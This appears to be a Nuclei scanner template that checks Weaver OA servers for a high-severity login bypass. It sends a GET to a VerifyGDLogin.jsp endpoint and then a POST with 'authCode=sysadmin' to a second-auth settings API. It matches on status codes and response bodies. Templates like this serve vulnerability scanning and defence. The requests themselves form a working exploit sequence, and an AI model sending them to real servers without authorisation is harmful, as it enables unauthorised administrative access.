id: Weaver-OA-LoginBypass
info:
  author: cr
  name: Weaver OA LoginBypass
  reference:
  - https://github.com/coldrainh
  severity: high
  tags: Weaver,oa,loginbypass
requests:
- matchers:
  - part: body
    regex:
    - /login/1
    type: regex
  - status:
    - 302
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/login/VerifyGDLogin.jsp?para1=1&para2=2'
- body: 'authCode=sysadmin

    '
  matchers:
  - part: body
    regex:
    - '{"status":"1"}'
    type: regex
  - status:
    - 200
    type: status
  matchers-condition: and
  method: POST
  path:
  - '{{BaseURL}}/api/encrypt/secondauthsetting/saveCAAuth'
